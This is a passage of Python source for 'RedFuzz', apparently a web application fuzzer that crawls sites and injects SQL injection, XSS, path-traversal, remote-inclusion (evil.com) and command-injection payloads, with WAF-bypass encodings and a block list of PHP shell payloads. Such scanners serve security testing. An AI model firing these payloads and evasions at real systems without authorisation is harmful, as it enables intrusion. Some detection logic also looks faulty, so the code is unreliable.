"""
RedFuzz - Advanced Web Application Fuzzer
Version: 5.0.0
Author: 0xRedHood (https://github.com/0xRedHood)
Description: A comprehensive web application fuzzer with advanced features including
stateful fuzzing, OpenAPI/Swagger integration, vulnerability verification, and plugin support.
GitHub: https://github.com/0xRedHood
"""

import requests
import argparse
import json
import time
import re
import sys
import yaml
import urllib3
import random
from urllib.parse import urlparse, parse_qs, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from difflib import SequenceMatcher
import threading
from typing import Dict, List, Optional, Any, Tuple
import logging
from dataclasses import dataclass, asdict
from datetime import datetime
import hashlib
import base64

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# For OpenAPI/Swagger support
try:
    import yaml as pyyaml
    OPENAPI_AVAILABLE = True
except ImportError:
    OPENAPI_AVAILABLE = False

# For BeautifulSoup web crawling
try:
    from bs4 import BeautifulSoup
    BEAUTIFULSOUP_AVAILABLE = True
except ImportError:
    BeautifulSoup = None
    BEAUTIFULSOUP_AVAILABLE = False

# For plugin system
import importlib.util
import os
from pathlib import Path

# Optional dependencies for performance improvements
try:
    import ujson as json
    JSON_FAST = True
    JSON_LIBRARY = "ujson"
except ImportError:
    try:
        import orjson as json
        JSON_FAST = True
        JSON_LIBRARY = "orjson"
    except ImportError:
        import json
        JSON_FAST = False
        JSON_LIBRARY = "standard"

try:
    import pyOpenSSL
    SSL_IMPROVED = True
except ImportError:
    SSL_IMPROVED = False

try:
    import PySocks
    SOCKS_SUPPORT = True
except ImportError:
    SOCKS_SUPPORT = False

# Check for Rich (TUI)
try:
    from rich.console import Console
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
    from rich.table import Table
    from rich.panel import Panel
    from rich.live import Live
    from rich.layout import Layout
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

# Check for PyYAML
try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False

@dataclass
class VulnerabilityEvidence:
    """Evidence for a discovered vulnerability"""
    request_url: str
    request_method: str
    request_headers: Dict[str, str]
    request_body: Optional[str]
    response_status: int
    response_headers: Dict[str, str]
    response_body: str
    payload_used: str
    detection_time: datetime
    response_time: float

@dataclass
class Vulnerability:
    """Enhanced vulnerability data structure"""
    vuln_type: str
    parameter: str
    payload: str
    evidence: VulnerabilityEvidence
    severity: str
    confidence: float
    verified: bool = False
    false_positive: bool = False

@dataclass
class SessionState:
    """Represents the state of a session during stateful fuzzing"""
    session_id: str
    cookies: Dict[str, str]
    headers: Dict[str, str]
    current_url: str
    login_required: bool = False
    authenticated: bool = False
    created_at: datetime = None
    
    def __post_init__(self):
        if self.created_at is None:
            self.created_at = datetime.now()

@dataclass
class OpenAPISpec:
    """Represents an OpenAPI/Swagger specification"""
    endpoints: List[Dict[str, Any]]
    base_url: str
    security_schemes: Dict[str, Any]
    info: Dict[str, Any]

class PluginManager:
    """Manages plugins for RedFuzz"""
    
    def __init__(self):
        self.plugins = {}
        self.plugin_dir = Path("plugins")
        self.plugin_dir.mkdir(exist_ok=True)
    
    def load_plugins(self):
        """Load all available plugins"""
        for plugin_file in self.plugin_dir.glob("*.py"):
            if plugin_file.name.startswith("__"):
                continue
            try:
                spec = importlib.util.spec_from_file_location(
                    plugin_file.stem, plugin_file
                )
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)
                
                if hasattr(module, 'register_plugin'):
                    plugin_info = module.register_plugin()
                    self.plugins[plugin_info['name']] = {
                        'module': module,
                        'info': plugin_info
                    }
                    print(f"Loaded plugin: {plugin_info['name']}")
            except Exception as e:
                print(f"Failed to load plugin {plugin_file.name}: {e}")
    
    def execute_plugin(self, plugin_name: str, data: Any) -> Any:
        """Execute a specific plugin"""
        if plugin_name in self.plugins:
            plugin = self.plugins[plugin_name]
            if hasattr(plugin['module'], 'execute'):
                return plugin['module'].execute(data)
        return None

class SmartRateLimiter:
    """Enhanced smart rate limiter with advanced features"""
    
    def __init__(self, initial_delay: float = 0.1, max_delay: float = 5.0):
        self.current_delay = initial_delay
        self.min_delay = 0.01
        self.max_delay = max_delay
        self.response_time_threshold = 2.0
        self.adaptive_adjustment = True
        self.burst_protection = True
        self.response_times = []
        self.max_response_history = 10
        self.last_request_time = 0
        self.burst_count = 0
        self.max_burst_count = 5
        
    def adjust_delay(self, response_time: float):
        """Adjust delay based on response time and advanced settings"""
        if not self.adaptive_adjustment:
            return
        
        # Store response time for analysis
        self.response_times.append(response_time)
        if len(self.response_times) > self.max_response_history:
            self.response_times.pop(0)
        
        # Calculate average response time
        avg_response_time = sum(self.response_times) / len(self.response_times)
        
        # Adjust delay based on response time
        if avg_response_time > self.response_time_threshold:
            # Server is slow, increase delay
            self.current_delay = min(self.current_delay * 1.5, self.max_delay)
        elif avg_response_time < self.response_time_threshold * 0.5:
            # Server is fast, decrease delay
            self.current_delay = max(self.current_delay * 0.8, self.min_delay)
        
        # Burst protection
        if self.burst_protection:
            import time
            current_time = time.time()
            time_since_last = current_time - self.last_request_time
            
            if time_since_last < self.current_delay * 0.5:
                self.burst_count += 1
                if self.burst_count > self.max_burst_count:
                    # Too many rapid requests, increase delay
                    self.current_delay = min(self.current_delay * 2, self.max_delay)
                    self.burst_count = 0
            else:
                self.burst_count = max(0, self.burst_count - 1)
            
            self.last_request_time = current_time
    
    def get_delay(self) -> float:
        """Get current delay with burst protection"""
        if self.burst_protection and self.burst_count > self.max_burst_count:
            return self.current_delay * 2
        return self.current_delay
    
    def reset(self):
        """Reset rate limiter state"""
        self.current_delay = self.min_delay
        self.response_times.clear()
        self.burst_count = 0
        self.last_request_time = 0

class RedFuzz:
    def __init__(self, target_url, threads=10, timeout=10, verbose=False, config_file=None, tui=False):
        """Initialize RedFuzz with enhanced thread safety"""
        self.verify_ssl = False
        self.target_url = target_url
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        self.quiet_mode = False
        self.tui = tui
        self.tui_instance = None
        
        # Initialize configuration
        self.config = {}
        self.baseline_response = None
        
        # Thread-safe session management - ENHANCED with larger connection pool
        self.session = requests.Session()
        self.session_lock = threading.Lock()  # Add thread lock for session modifications
        
        # Configure larger connection pool to avoid "Connection pool is full" warnings
        adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=50)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Initialize rate limiter
        self.rate_limiter = SmartRateLimiter()
        
        # Initialize plugin manager
        self.plugin_manager = PluginManager()
        self.plugin_manager.load_plugins()
        
        # Load configuration if provided
        if config_file:
            self.load_config(config_file)
            self.apply_config_settings()
        
        # Initialize WAF bypass techniques
        self.waf_bypass_techniques = [
            'case_swapping',
            'null_byte_injection',
            'double_encoding',
            'unicode_normalization',
            'comment_injection'
        ]
        
        # Initialize payload categories - will be populated by load_payloads()
        self.payload_categories = {}
        
        # Context-aware fuzzing patterns
        self.context_patterns = {
            'id': ['lfi', 'rfi', 'path_traversal'],
            'file': ['lfi', 'rfi', 'path_traversal'],
            'path': ['lfi', 'rfi', 'path_traversal'],
            'search': ['xss', 'sqli'],
            'query': ['xss', 'sqli'],
            'q': ['xss', 'sqli'],
            'input': ['xss', 'sqli'],
            'user': ['sqli', 'auth_bypass'],
            'pass': ['sqli', 'auth_bypass'],
            'email': ['xss', 'sqli'],
            'url': ['open_redirect', 'ssrf'],
            'redirect': ['open_redirect'],
            'callback': ['open_redirect', 'jsonp'],
            'jsonp': ['open_redirect', 'jsonp']
        }
        
        # Enhanced vulnerability tracking
        self.verified_vulnerabilities = []
        self.false_positives = []
        
        # Evidence collection
        self.evidence_collection = True
        
        # Vulnerability verification settings
        self.auto_verify = True
        self.verification_delay = 1.0
        
        # Stateful fuzzing mode
        self.stateful_mode = False
        
        # Load payloads AFTER initializing payload_categories
        self.load_payloads()
        
        # Initialize TUI if enabled
        if self.tui:
            self.initialize_tui()
        
        # Set default headers
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Initialize session state tracking
        self.session_states = {}
        self.current_session_id = None
        
        # Initialize OpenAPI spec
        self.openapi_spec = None
        self.api_endpoints = []
        
        # Initialize vulnerability tracking
        self.vulnerabilities = []
        
        # Initialize scan timing
        self.scan_start_time = time.time()
        
        # Logging setup
        self.setup_logging()
    
    def load_payloads(self):
        """Load payloads from YAML file with fallback to TXT - IMPROVED FILTERING AND LOGGING"""
        # Initialize payload categories if not already done
        if not self.payload_categories:
            self.payload_categories = {
                'sqli': [], 'xss': [], 'lfi': [], 'rfi': [],
                'command_injection': [], 'header_injection': [],
                'open_redirect': [], 'ssrf': [], 'auth_bypass': [], 'jsonp': []
            }

        try:
            # Try to load from payloads.yaml first
            if os.path.exists('payloads.yaml'):
                import yaml
                with open('payloads.yaml', 'r', encoding='utf-8') as f:
                    yaml_data = yaml.safe_load(f)
                
                if yaml_data and 'payloads' in yaml_data:
                    total_payloads = 0
                    dangerous_patterns = [
                        '<?php system', '<?php exec', '<?php shell_exec',
                        'data://text/plain,<?php', 'php://input', 'expect://'
                    ]
                    
                    for vuln_type, vuln_data in yaml_data['payloads'].items():
                        if 'categories' in vuln_data:
                            for category, cat_data in vuln_data['categories'].items():
                                if 'payloads' in cat_data:
                                    category_name = f"{vuln_type}_{category}"
                                    
                                    filtered_payloads = [
                                        p for p in cat_data['payloads']
                                        if not any(dp in p for dp in dangerous_patterns)
                                    ]

                                    if len(filtered_payloads) < len(cat_data['payloads']):
                                        self.log(f"⚠️  Filtered {len(cat_data['payloads']) - len(filtered_payloads)} potentially dangerous payloads.")
                                    
                                    # Ensure category exists before extending
                                    if category_name not in self.payload_categories:
                                        self.payload_categories[category_name] = []
                                    self.payload_categories[category_name].extend(filtered_payloads)
                                    
                                    # Backward compatibility for legacy category names
                                    legacy_map = {
                                        "sql_injection": "sqli", "xss": "xss", "lfi": "lfi", "rfi": "rfi",
                                        "command_injection": "command_injection", "header_injection": "header_injection",
                                        "open_redirect": "open_redirect", "ssrf": "ssrf",
                                        "auth_bypass": "auth_bypass", "jsonp": "jsonp"
                                    }
                                    if vuln_type in legacy_map:
                                        self.payload_categories[legacy_map[vuln_type]].extend(filtered_payloads)

                                    total_payloads += len(filtered_payloads)
                    
                    self.log(f"Loaded {total_payloads} payloads from YAML across {len(self.payload_categories)} categories.")
                    if self.verbose:
                        for cat, payloads in self.payload_categories.items():
                            if payloads:
                                self.log(f"  - Category '{cat}': {len(payloads)} payloads")
                    return
            
            # Fallback to payloads.txt
            if os.path.exists('payloads.txt'):
                with open('payloads.txt', 'r', encoding='utf-8') as f:
                    payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                
                # Basic categorization
                # (This part can be improved, but it's a fallback)
                self.payload_categories['sqli'].extend([p for p in payloads if 'select' in p.lower()])
                self.payload_categories['xss'].extend([p for p in payloads if '<script' in p.lower()])
                self.payload_categories['lfi'].extend([p for p in payloads if '../' in p])
                self.log(f"Loaded {len(payloads)} payloads from TXT file.")
                return
            
            # Fallback to built-in payloads if no files found
            self.log("No payload files found, using minimal default payloads.")
            self.payload_categories['sqli'].extend(["' OR '1'='1", "admin'--"])
            self.payload_categories['xss'].extend(["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"])
            self.payload_categories['lfi'].extend(["../../../etc/passwd"])
            
        except Exception as e:
            self.log(f"Error loading payloads: {e}. Using minimal fallback payloads.")
            self.payload_categories['basic'] = ["' OR '1'='1", "<script>alert('XSS')</script>"]

    def load_config(self, config_file):
        """Load configuration from YAML/JSON file with environment variable support"""
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                content = f.read()

            # Replace environment variables like ${VAR_NAME} or ${VAR_NAME:default}
            content = self._replace_env_vars(content)

            # Determine format and load
            if config_file.endswith(('.yaml', '.yml')):
                return yaml.safe_load(content)
            else: # Assume JSON for other extensions
                return json.loads(content)
        except Exception as e:
            self.log(f"Error loading config file '{config_file}': {e}")
            return {}
    
    def _replace_env_vars(self, content: str) -> str:
        """Replace environment variables in configuration content - FIXED"""
        import re
        import os
        
        # Pattern to match ${VAR_NAME} or ${VAR_NAME:default}
        pattern = r'\$\{([A-Z_][A-Z0-9_]*)(?::-([^}]*))?\}'
        
        def replace_var(match):
            var_name, default_value = match.groups()
            # Use default_value if the environment variable is not set
            return os.getenv(var_name, default_value if default_value is not None else "")
        
        return re.sub(pattern, replace_var, content)
    
    def set_proxy(self, proxy_url):
        """Set proxy with thread safety"""
        with self.session_lock:
            self.session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            self.log(f"Proxy set to: {proxy_url}")
    
    def set_cookies(self, cookies):
        """Set cookies with thread safety"""
        with self.session_lock:
            if isinstance(cookies, str):
                # Parse cookies string
                cookie_dict = {}
                for cookie in cookies.split(';'):
                    if '=' in cookie:
                        name, value = cookie.strip().split('=', 1)
                        cookie_dict[name] = value
                self.session.cookies.update(cookie_dict)
            else:
                self.session.cookies.update(cookies)
            self.log("Cookies set successfully")
    
    def update_session_headers(self, headers):
        """Update session headers with thread safety"""
        with self.session_lock:
            self.session.headers.update(headers)
            self.log(f"Session headers updated: {list(headers.keys())}")
    
    def rotate_user_agent(self):
        """Rotate User-Agent header if enabled with thread safety"""
        if hasattr(self, 'user_agent_rotation') and self.user_agent_rotation:
            if hasattr(self, 'user_agent_pool') and self.user_agent_pool:
                import random
                new_user_agent = random.choice(self.user_agent_pool)
                with self.session_lock:
                    self.session.headers['User-Agent'] = new_user_agent
                if self.verbose:
                    self.log(f"Rotated User-Agent to: {new_user_agent[:50]}...")
    
    def log(self, message, quiet=False):
        """Log message with timestamp"""
        if not quiet and not getattr(self, 'quiet_mode', False):
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] {message}")
    
    def summary_log(self, message):
        """Log summary message without timestamp"""
        if not getattr(self, 'quiet_mode', False):
            print(message)
        
    def get_baseline_response(self, url):
        """Get baseline response for comparison"""
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            return {
                'status_code': response.status_code,
                'content': response.text,
                'size': len(response.content),
                'headers': dict(response.headers)
            }
        except:
            return None
    
    def apply_waf_bypass(self, payload, technique):
        """Apply WAF bypass technique to payload"""
        if technique == 'url_encoding':
            return requests.utils.quote(payload)
        elif technique == 'double_encoding':
            return requests.utils.quote(requests.utils.quote(payload))
        elif technique == 'hex_encoding':
            return ''.join([hex(ord(c))[2:] for c in payload])
        elif technique == 'unicode_encoding':
            return payload.encode('unicode_escape').decode()
        elif technique == 'case_variation':
            return ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
        elif technique == 'comment_injection':
            return payload.replace("'", "'/**/")
        elif technique == 'null_byte_injection':
            return payload + '%00'
        elif technique == 'space_alternatives':
            return payload.replace(' ', '/**/')
        else:
            return payload
    
    def generate_context_aware_payloads(self, parameter_name, payload_type="all"):
        """Generate context-aware payloads based on parameter name"""
        # Determine context from parameter name
        param_lower = parameter_name.lower()
        contexts = []
        
        for pattern, context_list in self.context_patterns.items():
            if pattern in param_lower:
                contexts.extend(context_list)
        
        if not contexts:
            contexts = ['sql', 'xss', 'lfi', 'rfi', 'command']
        
        # Remove duplicates
        contexts = list(set(contexts))
        
        # Generate payloads for identified contexts
        payloads = []
        for context in contexts:
            context_payloads = self.generate_payloads(context)
            payloads.extend(context_payloads)
        
        return payloads
    
    def generate_payloads(self, payload_type="all", fast_mode=False, ultra_fast_mode=False):
        """Generate payloads from loaded categories - NO HARDCODED PAYLOADS"""
        payloads = []
        
        # Fast mode reduces payload count
        if fast_mode:
            payload_type = "fast"
        elif ultra_fast_mode:
            payload_type = "ultra_fast"
        
        # Define category mappings for different payload types
        category_mappings = {
            "all": ["sql_injection_basic", "xss_basic", "lfi_unix_linux", "rfi_basic", "command_injection_unix_linux", "header_injection_basic", "open_redirect_basic", "ssrf_basic"],
            "sql": ["sql_injection_basic", "sql_injection_advanced", "sql_injection_boolean_based", "sql_injection_time_based", "sql_injection_error_based"],
            "xss": ["xss_basic", "xss_advanced", "xss_filter_bypass", "xss_dom_xss"],
            "lfi": ["lfi_unix_linux", "lfi_windows", "lfi_php_wrappers"],
            "rfi": ["rfi_basic"],
            "command": ["command_injection_unix_linux", "command_injection_windows"],
            "header": ["header_injection_basic"],
            "redirect": ["open_redirect_basic"],
            "ssrf": ["ssrf_basic"],
            "auth": ["sql_injection_basic"],  # Use SQL injection for auth bypass
            "jsonp": ["open_redirect_basic"],  # Use open redirect for JSONP
            "standard": ["sql_injection_basic", "xss_basic", "lfi_unix_linux", "rfi_basic", "command_injection_unix_linux"],
            "fast": ["sql_injection_basic", "xss_basic", "lfi_unix_linux", "rfi_basic", "command_injection_unix_linux"],
            "ultra_fast": ["sql_injection_basic", "xss_basic", "lfi_unix_linux", "rfi_basic"]
        }
        
        # Get categories to use
        categories_to_use = category_mappings.get(payload_type, ["sqli", "xss", "lfi", "rfi"])
        
        # Extract payloads from loaded categories
        for category in categories_to_use:
            if category in self.payload_categories and self.payload_categories[category]:
                category_payloads = self.payload_categories[category]
                
                # Apply mode-specific filtering
                if fast_mode:
                    # Take first 3-5 payloads from each category
                    category_payloads = category_payloads[:min(4, len(category_payloads))]
                elif ultra_fast_mode:
                    # Take first 1-2 payloads from each category
                    category_payloads = category_payloads[:min(2, len(category_payloads))]
                
                payloads.extend(category_payloads)
        
        # If no payloads found, provide fallback minimal payloads
        if not payloads:
            self.log("Warning: No payloads found in categories, using fallback payloads")
            fallback_payloads = [
                "' OR '1'='1",  # Basic SQL
                "<script>alert('XSS')</script>",  # Basic XSS
                "../../../etc/passwd",  # Basic LFI
                "http://evil.com/shell.txt",  # Basic RFI
                "; ls -la"  # Basic Command Injection
            ]
            payloads = fallback_payloads[:3] if fast_mode else fallback_payloads[:1] if ultra_fast_mode else fallback_payloads
        
        # Log payload generation
        if self.verbose:
            self.log(f"Generated {len(payloads)} payloads for type '{payload_type}' from categories: {categories_to_use}")
        
        return payloads
    
    def crawl_website(self, base_url, max_depth=2):
        """Crawl website to discover endpoints and forms"""
        discovered_urls = set()
        discovered_forms = []
        urls_to_crawl = [base_url]
        crawled_count = 0
        
        def crawl_page(url, depth=0):
            nonlocal crawled_count
            if depth > max_depth or url in discovered_urls:
                return
            
            discovered_urls.add(url)
            crawled_count += 1
            
            # Update TUI crawl progress in real-time
            if self.tui and self.tui_instance:
                # Calculate progress based on actual crawling
                max_urls = 50  # Maximum URLs to crawl
                progress_percent = min((crawled_count / max_urls) * 80, 80)  # 0-80% during crawling
                self.tui_instance.update_crawl_progress(progress_percent)
                
                # Update current URL in stats
                self.tui_instance.update_stats(
                    current_url=url,
                    status=f"Crawling... ({crawled_count} URLs found)"
                )
            
            try:
                response = self.session.get(url, timeout=self.timeout, verify=False)
                
                if not BEAUTIFULSOUP_AVAILABLE:
                    self.log("BeautifulSoup not available, skipping HTML parsing")
                    return
                
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find all links
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    absolute_url = urljoin(url, href)
                    
                    # Only crawl same domain and not already discovered
                    if (urlparse(absolute_url).netloc == urlparse(base_url).netloc and 
                        absolute_url not in discovered_urls and 
                        len(discovered_urls) < 50):  # Limit to prevent infinite crawling
                        urls_to_crawl.append(absolute_url)
                
                # Find all forms
                for form in soup.find_all('form'):
                    form_data = {
                        'action': urljoin(url, form.get('action', '')),
                        'method': form.get('method', 'GET').upper(),
                        'inputs': []
                    }
                    
                    for input_tag in form.find_all(['input', 'textarea', 'select']):
                        input_data = {
                            'name': input_tag.get('name', ''),
                            'type': input_tag.get('type', 'text'),
                            'value': input_tag.get('value', '')
                        }
                        form_data['inputs'].append(input_data)
                    
                    discovered_forms.append(form_data)
                    
            except Exception as e:
                if self.verbose:
                    self.log(f"Error crawling {url}: {str(e)}")
        
        # Crawl all URLs in queue
        while urls_to_crawl and len(discovered_urls) < 50:
            url = urls_to_crawl.pop(0)
            crawl_page(url)
        
        # Complete crawl progress
        if self.tui and self.tui_instance:
            self.tui_instance.update_crawl_progress(100, visible=False)
            self.tui_instance.update_stats(status="Crawling completed")
        
        return list(discovered_urls), discovered_forms
    
    def test_rest_api(self, endpoint, method="GET", data=None, headers=None):
        """Test REST API endpoints"""
        try:
            if method.upper() == "GET":
                response = self.session.get(endpoint, headers=headers, timeout=self.timeout, verify=False)
            elif method.upper() == "POST":
                response = self.session.post(endpoint, json=data, headers=headers, timeout=self.timeout, verify=False)
            elif method.upper() == "PUT":
                response = self.session.put(endpoint, json=data, headers=headers, timeout=self.timeout, verify=False)
            elif method.upper() == "DELETE":
                response = self.session.delete(endpoint, headers=headers, timeout=self.timeout, verify=False)
            else:
                return None
            
            return {
                'endpoint': endpoint,
                'method': method,
                'status_code': response.status_code,
                'response_size': len(response.content),
                'response_time': response.elapsed.total_seconds(),
                'content_type': response.headers.get('content-type', ''),
                'response_headers': dict(response.headers)
            }
            
        except Exception as e:
            if self.verbose:
                self.log(f"Error testing API {endpoint}: {str(e)}")
            return None
    
    def advanced_vulnerability_detection(self, response, payload, baseline=None):
        """Advanced vulnerability detection using multiple methods"""
        
        # CRITICAL FIX: Check status code first - 403, 404, 500+ are usually not vulnerabilities
        status_code = response.status_code
        if status_code in [403, 404, 500, 501, 502, 503, 504, 505]:
            return False, None  # These status codes usually indicate no vulnerability
        
        content = response.text.lower()
        headers = dict(response.headers)
        
        # Method 1: Keyword-based detection (existing)
        if self.keyword_based_detection(content, payload):
            vuln_type = self.classify_vulnerability(payload, response)
            return True, vuln_type
        
        # Method 2: Response size comparison
        if baseline and self.size_based_detection(response, baseline):
            # Try to classify based on payload type
            vuln_type = self.classify_vulnerability(payload, response)
            if vuln_type == "Potential Vulnerability":
                vuln_type = "Potential Vulnerability (Size Difference)"
            return True, vuln_type
        
        # Method 3: Content similarity analysis
        if baseline and self.similarity_based_detection(response, baseline):
            # Try to classify based on payload type
            vuln_type = self.classify_vulnerability(payload, response)
            if vuln_type == "Potential Vulnerability":
                vuln_type = "Potential Vulnerability (Content Difference)"
            return True, vuln_type
        
        # Method 4: Error pattern detection
        if self.error_pattern_detection(content, headers):
            # Try to classify based on payload type
            vuln_type = self.classify_vulnerability(payload, response)
            if vuln_type == "Potential Vulnerability":
                vuln_type = "Potential Vulnerability (Error Pattern)"
            return True, vuln_type
        
        # Method 5: Time-based detection for blind vulnerabilities
        if self.time_based_detection(response, payload):
            return True, "Potential Blind Vulnerability"
        
        return False, None
    
    def keyword_based_detection(self, content, payload):
        """Enhanced keyword-based detection"""
        # SQL Injection indicators
        sql_indicators = [
            'sql syntax', 'mysql error', 'oracle error', 'sqlite error',
            'postgresql error', 'microsoft ole db provider', 'odbc error',
            'sql server', 'mysql_fetch_array', 'mysql_fetch_object',
            'mysql_num_rows', 'mysql_fetch_assoc', 'mysql_fetch_row',
            'supplied argument is not a valid mysql result',
            'you have an error in your sql syntax',
            'warning: mysql', 'mysql error', 'oracle error',
            'postgresql error', 'sqlite error', 'microsoft ole db',
            'odbc error', 'jdbc error', 'sql server error'
        ]
        
        # XSS indicators
        xss_indicators = [
            'script', 'javascript:', 'onerror', 'onload', 'onclick',
            'onmouseover', 'onfocus', 'onblur', 'onchange', 'onsubmit',
            'eval(', 'document.cookie', 'window.location', 'alert(',
            'confirm(', 'prompt(', 'innerhtml', 'outerhtml'
        ]
        
        # LFI indicators
        lfi_indicators = [
            'root:x:', 'bin:x:', 'daemon:x:', 'windows', 'system32',
            'administrator', 'guest:', 'nobody:', 'mysql:', 'apache:',
            'www-data:', 'nt authority', 'local system', 'network service',
            'windows nt', 'microsoft windows', 'win.ini', 'boot.ini',
            'system.ini', 'autoexec.bat', 'config.sys'
        ]
        
        # Command injection indicators
        cmd_indicators = [
            'uid=', 'gid=', 'groups=', 'home=', 'shell=', 'login:',
            'directory of', 'volume in drive', 'bytes free', 'total bytes',
            'file(s)', 'dir(s)', 'command completed', 'process list',
            'task list', 'system information', 'windows version'
        ]
        
        # Check for indicators
        all_indicators = sql_indicators + xss_indicators + lfi_indicators + cmd_indicators
        for indicator in all_indicators:
            if indicator in content:
                return True
                
        return False
    
    def size_based_detection(self, response, baseline):
        """Detect vulnerabilities based on response size differences"""
        current_size = len(response.content)
        baseline_size = baseline.get('size', 0)
        
        # If size difference is significant (>50% or >1000 bytes)
        if baseline_size > 0:
            size_diff = abs(current_size - baseline_size)
            size_ratio = size_diff / baseline_size
            
            if size_ratio > 0.5 or size_diff > 1000:
                return True
        
        return False
    
    def similarity_based_detection(self, response, baseline):
        """Detect vulnerabilities based on content similarity"""
        current_content = response.text
        baseline_content = baseline.get('content', '')
        
        if baseline_content:
            similarity = SequenceMatcher(None, baseline_content, current_content).ratio()
            # If similarity is low (<0.7), it might indicate a vulnerability
            if similarity < 0.7:
                return True
        
        return False
    
    def error_pattern_detection(self, content, headers):
        """Detect error patterns in response"""
        error_patterns = [
            r'error\s+\d+', r'warning\s+\d+', r'fatal\s+error',
            r'parse\s+error', r'syntax\s+error', r'undefined\s+',
            r'null\s+reference', r'index\s+out\s+of\s+bounds',
            r'division\s+by\s+zero', r'stack\s+overflow',
            r'access\s+violation', r'segmentation\s+fault'
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        return False
    
    def time_based_detection(self, response, payload):
        """Detect time-based vulnerabilities"""
        # Check if response time is unusually long (indicating time-based injection)
        if response.elapsed.total_seconds() > 3:
            time_based_payloads = ['sleep', 'waitfor', 'benchmark', 'pg_sleep']
            if any(payload.lower() in p for p in time_based_payloads):
                return True
        
        return False
    
    def classify_vulnerability(self, payload, response):
        """Enhanced vulnerability classification based on payload and response"""
        content = response.text.lower()
        payload_lower = payload.lower()
        
        # SQL Injection - Check both payload and response
        sql_patterns = ['sql syntax', 'mysql error', 'oracle error', 'sqlite error', 
                       'postgresql error', 'microsoft ole db', 'odbc error', 'jdbc error']
        sql_payloads = ["' or", "' union", "admin'", "1' or", "'; drop", "union select"]
        
        if any(pattern in content for pattern in sql_patterns) or any(p in payload_lower for p in sql_payloads):
            return 'SQL Injection'
        
        # XSS - Check both payload and response
        xss_patterns = ['script', 'javascript:', 'onerror', 'onload', 'onclick', 'eval(']
        xss_payloads = ['<script>', 'javascript:', 'onerror', 'onload', 'onclick', 'alert(']
        
        if any(pattern in content for pattern in xss_patterns) or any(p in payload_lower for p in xss_payloads):
            return 'XSS'
        
        # LFI - Check both payload and response
        lfi_patterns = ['root:x:', 'bin:x:', 'daemon:x:', 'windows', 'system32', 'administrator']
        lfi_payloads = ['../', '/etc/', 'windows', 'system32', 'passwd', 'hosts']
        
        if any(pattern in content for pattern in lfi_patterns) or any(p in payload_lower for p in lfi_payloads):
            return 'LFI'
        
        # Command Injection - Check both payload and response
        cmd_patterns = ['uid=', 'gid=', 'groups=', 'directory of', 'volume in drive', 'bytes free']
        cmd_payloads = ['; ls', '| whoami', '`id`', '$(whoami)', '; cat', '| netstat']
        
        if any(pattern in content for pattern in cmd_patterns) or any(p in payload_lower for p in cmd_payloads):
            return 'Command Injection'
        
        # RFI - Check payload for remote URLs
        rfi_payloads = ['http://', 'https://', 'ftp://', '//evil.com', 'data://']
        if any(p in payload_lower for p in rfi_payloads):
            return 'RFI'
        
        # Try to classify based on payload content only
        if any(p in payload_lower for p in sql_payloads):
            return 'Potential SQL Injection'
        elif any(p in payload_lower for p in xss_payloads):
            return 'Potential XSS'
        elif any(p in payload_lower for p in lfi_payloads):
            return 'Potential LFI'
        elif any(p in payload_lower for p in cmd_payloads):
            return 'Potential Command Injection'
        elif any(p in payload_lower for p in rfi_payloads):
            return 'Potential RFI'
        
        return 'Potential Vulnerability'
    
    def fuzz_parameter(self, url, param, payload, method="GET", data=None, headers=None, waf_bypass=False):
        """Enhanced parameter fuzzing with WAF bypass support - FIXED URL parameter handling"""
        
        def _make_request():
            try:
                # Use the payload parameter from the outer scope
                current_payload = payload
                
                # Apply WAF bypass if requested
                if waf_bypass:
                    current_payload = self.apply_waf_bypass(current_payload, random.choice(self.waf_bypass_techniques))
                
                # Rotate User-Agent if enabled
                self.rotate_user_agent()
                
                if method.upper() == "GET":
                    # FIXED: Use proper URL parameter replacement instead of string.replace()
                    parsed_url = urlparse(url)
                    params = parse_qs(parsed_url.query)
                    
                    # Update the specific parameter with payload
                    params[param] = [current_payload]
                    
                    # Reconstruct URL properly
                    new_query = "&".join([f"{k}={v[0]}" for k, v in params.items()])
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                    
                    response = self.session.get(test_url, timeout=self.timeout, verify=self.verify_ssl)
                elif method.upper() == "POST":
                    # Fuzz POST data
                    test_data = data.copy() if data else {}
                    test_data[param] = current_payload
                    response = self.session.post(url, data=test_data, timeout=self.timeout, verify=self.verify_ssl)
                else:
                    return None
                
                # Apply smart rate limiting if enabled
                if hasattr(self, 'rate_limiter') and self.rate_limiter:
                    response_time = response.elapsed.total_seconds()
                    self.rate_limiter.adjust_delay(response_time)
                    import time
                    time.sleep(self.rate_limiter.get_delay())
                
                # Analyze response
                result = {
                    'url': url,
                    'parameter': param,
                    'payload': current_payload,
                    'method': method,
                    'status_code': response.status_code,
                    'response_size': len(response.content),
                    'response_time': response.elapsed.total_seconds(),
                    'content_type': response.headers.get('content-type', ''),
                    'vulnerable': False,
                    'vulnerability_type': None
                }
                
                # Advanced vulnerability detection
                vulnerable, vuln_type = self.advanced_vulnerability_detection(
                    response, current_payload, self.baseline_response
                )
                
                if vulnerable:
                    result['vulnerable'] = True
                    result['vulnerability_type'] = vuln_type if vuln_type else 'Potential Vulnerability'
